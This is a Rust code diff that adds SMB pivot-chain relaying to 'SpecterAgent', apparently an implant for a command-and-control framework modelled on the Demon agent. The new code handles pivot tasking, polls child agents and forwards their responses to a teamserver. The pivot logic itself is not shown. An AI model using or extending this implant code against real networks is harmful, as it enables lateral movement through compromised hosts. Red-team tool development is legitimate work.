@@ -13,6 +13,7 @@ use crate::config::SpecterConfig;
 use crate::dispatch::{self, DispatchResult, MemFileStore};
 use crate::download::DownloadTracker;
 use crate::error::SpecterError;
+use crate::pivot::PivotState;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
 };
@@ -41,6 +42,8 @@ pub struct SpecterAgent {
     mem_files: MemFileStore,
     /// Socket state for SOCKS5 proxy and reverse port forwarding.
     socket_state: SocketState,
+    /// Pivot state for SMB pivot chain relay.
+    pivot_state: PivotState,
 }
 
 impl SpecterAgent {
@@ -75,6 +78,7 @@ impl SpecterAgent {
             downloads: DownloadTracker::new(),
             mem_files: HashMap::new(),
             socket_state: SocketState::new(),
+            pivot_state: PivotState::new(),
         })
     }
 
@@ -207,6 +211,25 @@ impl SpecterAgent {
                     continue;
                 }
 
+                // CommandPivot manages SMB pipe state — handle it directly so
+                // the PivotState can track connections and poll them later.
+                if package.command_id == u32::from(DemonCommand::CommandPivot) {
+                    if let Some(resp) = self.pivot_state.handle_command(&package.payload) {
+                        let rid =
+                            if resp.request_id != 0 { resp.request_id } else { package.request_id };
+                        if let Err(e) =
+                            self.send_callback_raw(resp.command_id, rid, &resp.payload).await
+                        {
+                            warn!(
+                                agent_id = format_args!("0x{:08X}", self.agent_id),
+                                error = %e,
+                                "failed to send pivot response"
+                            );
+                        }
+                    }
+                    continue;
+                }
+
                 let result = dispatch::dispatch(
                     package,
                     &mut self.config,
@@ -241,6 +264,26 @@ impl SpecterAgent {
                         command_id = resp.command_id,
                         error = %e,
                         "failed to send socket response"
+                    );
+                }
+            }
+
+            // Poll connected SMB pivots for child agent responses (mirrors
+            // Demon's PivotPush).
+            if self.pivot_state.has_active_pivots() {
+                self.pivot_state.poll();
+            }
+
+            // Send any pending pivot responses back to the teamserver.
+            for resp in self.pivot_state.drain_responses() {
+                let req_id = resp.request_id;
+                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
+                {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        command_id = resp.command_id,
+                        error = %e,
+                        "failed to send pivot response"
                     );
                 }
             }
